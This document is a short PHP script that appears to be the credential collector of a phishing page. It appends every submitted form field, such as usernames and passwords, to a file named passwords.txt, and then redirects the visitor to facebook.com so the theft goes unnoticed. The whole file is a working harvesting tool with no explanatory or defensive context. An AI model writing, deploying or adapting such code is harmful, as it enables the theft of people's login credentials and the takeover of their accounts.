<?php
$file = fopen("passwords.txt", "a");
foreach($_POST as $key => $value) {
    fwrite($file, $key);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
fwrite($file, "\n");
fclose($file);
header("Location: https://www.facebook.com");
die();
?>